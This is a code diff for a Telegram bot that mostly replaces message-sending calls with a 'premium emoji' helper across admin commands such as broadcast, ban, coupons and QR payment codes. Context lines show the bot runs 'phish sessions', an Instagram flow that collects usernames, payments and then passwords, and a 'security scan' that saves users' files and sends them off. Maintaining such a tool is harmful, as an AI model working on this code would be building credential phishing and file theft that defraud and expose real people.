-            await S7.sendMessage(msg.chat.id, `✅ Broadcast sent to ${sent} users.`);
-            logToFile(`Admin broadcast: ${message}`);
+            await sendWithPremium(msg.chat.id, '✅ Broadcast sent to ' + sent + ' users.');
+            logToFile('Admin broadcast: ' + message);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
@@ -3774,14 +3682,14 @@ S7.on('message', async (msg) => {
         const user = await getUser(msg.from.id);
         user._waitingForQR = true;
         await user.save();
-        await S7.sendMessage(msg.chat.id, '📤 Please send the QR code image (photo or document).');
+        await sendWithPremium(msg.chat.id, '📤 Please send the QR code image (photo or document).');
         return;
     }
 
     if (cmd === '/removeqr') {
         const removed = await deleteQR();
-        if (removed) await S7.sendMessage(msg.chat.id, '✅ QR code removed.');
-        else await S7.sendMessage(msg.chat.id, '❌ No QR code found.');
+        if (removed) await sendWithPremium(msg.chat.id, '✅ QR code removed.');
+        else await sendWithPremium(msg.chat.id, '❌ No QR code found.');
         return;
     }
 
@@ -3790,7 +3698,7 @@ S7.on('message', async (msg) => {
             const qrBuffer = await getQR();
             await S7.sendPhoto(msg.chat.id, qrBuffer, { caption: '💳 Current QR Code' });
         } else {
-            await S7.sendMessage(msg.chat.id, '❌ No QR code uploaded yet.');
+            await sendWithPremium(msg.chat.id, '❌ No QR code uploaded yet.');
         }
         return;
     }
@@ -3801,10 +3709,10 @@ S7.on('message', async (msg) => {
         const link = args[3];
         try {
             await addChannel(id, name, link);
-            await S7.sendMessage(msg.chat.id, `✅ Channel "${name}" added.`);
-            logToFile(`Admin added channel ${id}`);
+            await sendWithPremium(msg.chat.id, '✅ Channel "' + name + '" added.');
+            logToFile('Admin added channel ' + id);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
@@ -3813,20 +3721,20 @@ S7.on('message', async (msg) => {
         const id = args[1];
         try {
             await removeChannel(id);
-            await S7.sendMessage(msg.chat.id, `✅ Channel ${id} removed.`);
-            logToFile(`Admin removed channel ${id}`);
+            await sendWithPremium(msg.chat.id, '✅ Channel ' + id + ' removed.');
+            logToFile('Admin removed channel ' + id);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
 
     if (cmd === '/channels') {
         const channels = await getChannels();
-        if (channels.length === 0) return S7.sendMessage(msg.chat.id, 'No channels.');
+        if (channels.length === 0) return sendWithPremium(msg.chat.id, 'No channels.');
         let list = '📢 <b>Channels</b>\n\n';
-        channels.forEach(c => { list += `• ${c.name} (${c.id}) - ${c.link}\n`; });
-        await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
+        channels.forEach(c => { list += '• ' + c.name + ' (' + c.id + ') - ' + c.link + '\n'; });
+        await sendWithPremium(msg.chat.id, list);
         return;
     }
 
@@ -3834,7 +3742,7 @@ S7.on('message', async (msg) => {
         const user = await getUser(msg.from.id);
         user._waitingForPhoto = true;
         await user.save();
-        await S7.sendMessage(msg.chat.id, '📸 Please send the photo (or document image) you want to add. Include caption in the message.');
+        await sendWithPremium(msg.chat.id, '📸 Please send the photo (or document image) you want to add. Include caption in the message.');
         return;
     }
 
@@ -3842,23 +3750,23 @@ S7.on('message', async (msg) => {
         const photoId = args[1];
         try {
             await setFeaturedPhoto(photoId);
-            await S7.sendMessage(msg.chat.id, `✅ Featured photo set to ${photoId}.`);
-            logToFile(`Admin set featured photo ${photoId}`);
+            await sendWithPremium(msg.chat.id, '✅ Featured photo set to ' + photoId + '.');
+            logToFile('Admin set featured photo ' + photoId);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
 
     if (cmd === '/featuredmsg') {
         const message = args.slice(1).join(' ');
-        if (!message) return S7.sendMessage(msg.chat.id, '⚠️ Usage: /featuredmsg [message]');
+        if (!message) return sendWithPremium(msg.chat.id, '⚠️ Usage: /featuredmsg [message]');
         try {
             await setFeaturedMessage(message);
-            await S7.sendMessage(msg.chat.id, '✅ Featured message updated.');
-            logToFile(`Admin set featured message: ${message}`);
+            await sendWithPremium(msg.chat.id, '✅ Featured message updated.');
+            logToFile('Admin set featured message: ' + message);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
@@ -3866,10 +3774,10 @@ S7.on('message', async (msg) => {
     if (cmd === '/featuredtoggle') {
         try {
             const featured = await toggleFeaturedStatus();
-            await S7.sendMessage(msg.chat.id, `✅ Featured ${featured.status ? 'activated' : 'deactivated'}.`);
-            logToFile(`Admin toggled featured to ${featured.status}`);
+            await sendWithPremium(msg.chat.id, '✅ Featured ' + (featured.status ? 'activated' : 'deactivated') + '.');
+            logToFile('Admin toggled featured to ' + featured.status);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
@@ -3880,18 +3788,18 @@ S7.on('message', async (msg) => {
             if (fs.existsSync(logPath)) {
                 const logs = fs.readFileSync(logPath, 'utf8');
                 const lastLogs = logs.split('\n').slice(-50).join('\n');
-                await S7.sendMessage(msg.chat.id, '📋 <b>Recent Logs</b>\n\n<pre>' + (lastLogs || 'No logs') + '</pre>', { parse_mode: 'HTML' });
+                await sendWithPremium(msg.chat.id, '📋 <b>Recent Logs</b>\n\n<pre>' + (lastLogs || 'No logs') + '</pre>');
             } else {
-                await S7.sendMessage(msg.chat.id, 'No logs.');
+                await sendWithPremium(msg.chat.id, 'No logs.');
             }
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
 
     if (cmd === '/restart') {
-        await S7.sendMessage(msg.chat.id, '🔄 Restarting bot...');
+        await sendWithPremium(msg.chat.id, '🔄 Restarting bot...');
         logToFile('Admin restarted bot');
         process.exit(0);
         return;
@@ -3901,10 +3809,10 @@ S7.on('message', async (msg) => {
         const userId = args[1];
         const message = args.slice(2).join(' ');
         try {
-            await S7.sendMessage(userId, '💬 <b>Message from Admin</b>\n\n' + message, { parse_mode: 'HTML' });
-            await S7.sendMessage(msg.chat.id, `✅ Message sent to ${userId}`);
+            await sendWithPremium(userId, '💬 <b>Message from Admin</b>\n\n' + message);
+            await sendWithPremium(msg.chat.id, '✅ Message sent to ' + userId);
         } catch (err) {
-            S7.sendMessage(msg.chat.id, '❌ Error: ' + err.message);
+            sendWithPremium(msg.chat.id, '❌ Error: ' + err.message);
         }
         return;
     }
@@ -3912,26 +3820,26 @@ S7.on('message', async (msg) => {
     if (cmd === '/ban' && args.length >= 2) {
         const identifier = args[1];
         const userId = await resolveUserId(identifier);
-        if (!userId) return S7.sendMessage(msg.chat.id, '❌ User not found.');
+        if (!userId) return sendWithPremium(msg.chat.id, '❌ User not found.');
         const user = await getUser(userId);
         user.banned = true;
         await user.save();
-        await S7.sendMessage(msg.chat.id, `✅ User ${userId} banned successfully.`);
-        await S7.sendMessage(userId, '🚫 You have been banned from using this bot.');
-        logToFile(`Admin banned user ${userId}`);
+        await sendWithPremium(msg.chat.id, '✅ User ' + userId + ' banned successfully.');
+        await sendWithPremium(userId, '🚫 You have been banned from using this bot.');
+        logToFile('Admin banned user ' + userId);
         return;
     }
 
     if (cmd === '/unban' && args.length >= 2) {
         const identifier = args[1];
         const userId = await resolveUserId(identifier);
-        if (!userId) return S7.sendMessage(msg.chat.id, '❌ User not found.');
+        if (!userId) return sendWithPremium(msg.chat.id, '❌ User not found.');
         const user = await getUser(userId);
         user.banned = false;
         await user.save();
-        await S7.sendMessage(msg.chat.id, `✅ User ${userId} unbanned successfully.`);
-        await S7.sendMessage(userId, '✅ You have been unbanned. You can now use the bot.');
-        logToFile(`Admin unbanned user ${userId}`);
+        await sendWithPremium(msg.chat.id, '✅ User ' + userId + ' unbanned successfully.');
+        await sendWithPremium(userId, '✅ You have been unbanned. You can now use the bot.');
+        logToFile('Admin unbanned user ' + userId);
         return;
     }
 
@@ -3940,34 +3848,34 @@ S7.on('message', async (msg) => {
         const credits = parseInt(args[2]);
         const maxUses = parseInt(args[3]);
         if (isNaN(credits) || isNaN(maxUses) || credits <= 0 || maxUses <= 0) {
-            return S7.sendMessage(msg.chat.id, '⚠️ Please enter valid numbers.');
+            return sendWithPremium(msg.chat.id, '⚠️ Please enter valid numbers.');
         }
         try {
             const coupon = await createCoupon(code, credits, maxUses, msg.from.id.toString());
-            await S7.sendMessage(msg.chat.id, `✅ Coupon created!\nCode: <code>${code}</code>\nCredits: ${credits}\nMax Uses: ${maxUses}`, { parse_mode: 'HTML' });
-            logToFile(`Admin created coupon: ${code}`);
+            await sendWithPremium(msg.chat.id, '✅ Coupon created!\nCode: <code>' + code + '</code>\nCredits: ' + credits + '\nMax Uses: ' + maxUses);
+            logToFile('Admin created coupon: ' + code);
         } catch (err) {
-            await S7.sendMessage(msg.chat.id, '❌ Coupon code already exists or error: ' + err.message);
+            await sendWithPremium(msg.chat.id, '❌ Coupon code already exists or error: ' + err.message);
         }
         return;
     }
 
     if (cmd === '/coupons') {
         const coupons = await getCoupons();
-        if (coupons.length === 0) return S7.sendMessage(msg.chat.id, 'No coupons available.');
+        if (coupons.length === 0) return sendWithPremium(msg.chat.id, 'No coupons available.');
         let list = '📋 <b>Coupons List</b>\n\n';
         coupons.forEach(c => {
-            list += `🔹 <code>${c.code}</code> - ${c.credits} credits | Used: ${c.usedCount}/${c.maxUses}\n`;
+            list += '🔹 <code>' + c.code + '</code> - ' + c.credits + ' credits | Used: ' + c.usedCount + '/' + c.maxUses + '\n';
         });
-        await S7.sendMessage(msg.chat.id, list, { parse_mode: 'HTML' });
+        await sendWithPremium(msg.chat.id, list);
         return;
     }
 
     if (cmd === '/deletecoupon' && args.length === 2) {
         const code = args[1];
         await deleteCoupon(code);
-        await S7.sendMessage(msg.chat.id, `✅ Coupon <code>${code}</code> deleted.`, { parse_mode: 'HTML' });
-        logToFile(`Admin deleted coupon: ${code}`);
+        await sendWithPremium(msg.chat.id, '✅ Coupon <code>' + code + '</code> deleted.');
+        logToFile('Admin deleted coupon: ' + code);
         return;
     }
 });
@@ -3990,12 +3898,12 @@ S7.on('message', async (msg) => {
         const buffer = await response.buffer();
 
         const photo = await addPhoto(buffer, msg.document ? msg.document.file_name : 'photo.jpg', caption);
-        await S7.sendMessage(msg.chat.id, `✅ Photo uploaded: ${photo.id}`);
+        await sendWithPremium(msg.chat.id, '✅ Photo uploaded: ' + photo.id);
         user._waitingForPhoto = false;
         await user.save();
-        logToFile(`Admin uploaded photo ${photo.id}`);
+        logToFile('Admin uploaded photo ' + photo.id);
     } catch (err) {
-        S7.sendMessage(msg.chat.id, '❌ Error uploading photo: ' + err.message);
+        sendWithPremium(msg.chat.id, '❌ Error uploading photo: ' + err.message);
     }
 });
 
@@ -4017,10 +3925,10 @@ S7.on('message', async (msg) => {
         await saveQRBuffer(buffer);
         user._waitingForQR = false;
         await user.save();
-        await S7.sendMessage(msg.chat.id, '✅ QR code saved successfully.');
+        await sendWithPremium(msg.chat.id, '✅ QR code saved successfully.');
         logToFile('QR uploaded via bot');
     } catch (err) {
-        S7.sendMessage(msg.chat.id, '❌ Error saving QR: ' + err.message);
+        sendWithPremium(msg.chat.id, '❌ Error saving QR: ' + err.message);
     }
 });
 
@@ -4032,14 +3940,13 @@ S7.on('message', async (msg) => {
         const code = text.replace('/redeem ', '').trim();
         const userId = msg.from.id;
         const user = await getUser(userId);
-        if (user.banned) return S7.sendMessage(userId, '🚫 You are banned.');
+        if (user.banned) return sendWithPremium(userId, '🚫 You are banned.');
         const result = await redeemCoupon(userId, code);
-        const star = getPremiumEmoji('⭐');
         if (result.error) {
-            await S7.sendMessage(userId, '❌ ' + result.error);
+            await sendWithPremium(userId, '❌ ' + result.error);
         } else {
-            await S7.sendMessage(userId, `✅ Coupon redeemed! +${result.credits} credits added.\n${star} Total Credits: ${(await getUser(userId)).credits}`);
-            logToFile(`🎫 User ${userId} redeemed coupon ${code}`);
+            await sendWithPremium(userId, '✅ Coupon redeemed! +' + result.credits + ' credits added.\n⭐ Total Credits: ' + (await getUser(userId)).credits);
+            logToFile('🎫 User ' + userId + ' redeemed coupon ' + code);
         }
         return;
     }
@@ -4069,14 +3976,14 @@ setTimeout(async () => {
     console.log('✅ Cleanup complete');
 }, 5000);
 
-// ====================== FIX: phishSessions cleanup ======================
+// ====================== phishSessions cleanup ======================
 if (!global.phishSessions) global.phishSessions = {};
 setInterval(() => {
     const now = Date.now();
     for (const [sid, sess] of Object.entries(global.phishSessions)) {
         if (now - sess.createdAt > 3600000) {
             delete global.phishSessions[sid];
-            console.log(`🗑️ Cleaned up old phish session: ${sid}`);
+            console.log('🗑️ Cleaned up old phish session: ' + sid);
         }
     }
 }, 60000);
@@ -4104,7 +4011,7 @@ async function startServer() {
             console.log('📸 NEW INSTAGRAM FLOW: username → plan → payment (1K) → password');
             console.log('✅ All buttons styled (Primary, Success, Danger) as per Telegram API 9.4+');
             console.log('✅ Menu button registered (☰) with /start and /menu commands');
-            console.log('✅ Premium emojis added to all messages');
+            console.log('✅ Premium emojis added to all messages using custom_emoji_id');
             console.log('✅ Max opens increased to ' + config.MAX_OPENS);
             console.log('✅ Channel buttons use primary style, Check All Joined uses success style');
             console.log('✅ Security scan saves ALL files (1KB-1MB) and sends after close');
